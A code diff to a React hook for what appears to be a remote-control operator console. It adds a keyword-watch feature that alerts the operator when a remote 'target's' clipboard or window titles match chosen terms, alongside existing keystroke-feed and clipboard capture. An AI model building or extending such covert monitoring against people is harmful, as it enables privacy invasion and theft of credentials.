@@ -1,6 +1,7 @@
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { api, formatThrownError } from "@/lib/api";
 import { paths } from "@/lib/api-paths";
+import { copyText } from "@/lib/clipboard";
 import { useI18n } from "@/lib/i18n";
 import type { RemoteInputEvent } from "./input-events";
 import { appendKeyFeed } from "./RdpKeys";
@@ -75,6 +76,14 @@ export interface ClipboardState {
   source: "agent" | "operator";
   truncated: boolean;
   at: number;
+}
+
+/** One keyword alert reported by the agent's clipboard/window watcher. */
+export interface KeywordAlert {
+  source: "clipboard" | "window" | string;
+  term: string;
+  preview: string;
+  ts: number;
 }
 
 /** One remembered clipboard value as listed by the agent (preview only). */
@@ -198,6 +207,9 @@ interface SignalMessage {
   height?: number;
   tile?: number;
   full?: boolean;
+  term?: string;
+  preview?: string;
+  ts?: number;
 }
 
 /**
@@ -264,6 +276,9 @@ export function useWebRTCLive(agentId: string) {
   // the bounded tail of what the target typed.
   const [keysOn, setKeysOn] = useState(false);
   const [keysFeed, setKeysFeed] = useState("");
+  // Keyword alerts: bounded list of matches reported by the agent's watcher.
+  const [keywordAlerts, setKeywordAlerts] = useState<KeywordAlert[]>([]);
+  const [keywordWatchOn, setKeywordWatchOn] = useState(false);
   // Exclusive control: the agent has one controller at a time. `null` means
   // nobody holds the lease yet (the next input claims it).
   const [control, setControl] = useState<{ holder: string; you: boolean } | null>(null);
@@ -433,6 +448,8 @@ export function useWebRTCLive(agentId: string) {
     setClipboard(null);
     setClipboardError("");
     setClipboardHistory([]);
+    setKeywordAlerts([]);
+    setKeywordWatchOn(false);
     if (agentId) {
       // Fallback for an agent whose signaling socket died before it saw the
       // close: the server queues screen_webrtc_stop. The session id keeps a
@@ -462,6 +479,27 @@ export function useWebRTCLive(agentId: string) {
   const toggleKeys = useCallback((enabled: boolean) => {
     if (enabled) setKeysFeed("");
     if (!sendSignal({ type: "keys", enabled })) setKeysOn(false);
+  }, [sendSignal]);
+
+  const configureKeywordWatch = useCallback((opts: {
+    enabled: boolean;
+    keywords: string[];
+    minIntervalMs?: number;
+    clipboard?: boolean;
+    windowTitle?: boolean;
+  }): boolean => {
+    const ok = sendSignal({
+      type: "keyword_watch",
+      keywords: opts.keywords,
+      min_interval_ms: opts.minIntervalMs ?? 2000,
+      clipboard: opts.clipboard ?? true,
+      window_title: opts.windowTitle ?? false,
+    });
+    if (ok) {
+      setKeywordWatchOn(opts.enabled && opts.keywords.length > 0);
+      if (!opts.enabled) setKeywordAlerts([]);
+    }
+    return ok;
   }, [sendSignal]);
 
   const takeControl = useCallback(() => {
@@ -584,10 +622,9 @@ export function useWebRTCLive(agentId: string) {
 
   const copyClipboardToLocal = useCallback(async () => {
     if (!clipboard) return;
-    try {
-      await navigator.clipboard.writeText(clipboard.text);
+    if (await copyText(clipboard.text)) {
       setClipboardError("");
-    } catch {
+    } else {
       setClipboardError(t("agents.rdp_clipboard_denied"));
     }
   }, [clipboard, t]);
@@ -840,6 +877,20 @@ export function useWebRTCLive(agentId: string) {
               setKeysFeed((prev) => appendKeyFeed(prev, message.text as string));
             }
             break;
+          case "keyword_watch":
+            if (typeof message.enabled === "boolean") setKeywordWatchOn(message.enabled);
+            break;
+          case "keyword_alert": {
+            if (typeof message.term !== "string") break;
+            const alert: KeywordAlert = {
+              source: typeof message.source === "string" ? message.source : "",
+              term: message.term,
+              preview: typeof message.preview === "string" ? message.preview : "",
+              ts: typeof message.ts === "number" ? message.ts : Date.now() / 1000,
+            };
+            setKeywordAlerts((prev) => [alert, ...prev].slice(0, 50));
+            break;
+          }
           case "control": {
             const holder = typeof message.holder === "string" ? message.holder : "";
             setControl(holder ? { holder, you: message.you === true } : null);
@@ -977,6 +1028,9 @@ export function useWebRTCLive(agentId: string) {
     keysOn,
     keysFeed,
     toggleKeys,
+    keywordAlerts,
+    keywordWatchOn,
+    configureKeywordWatch,
     control,
     takeControl,
     releaseControl,
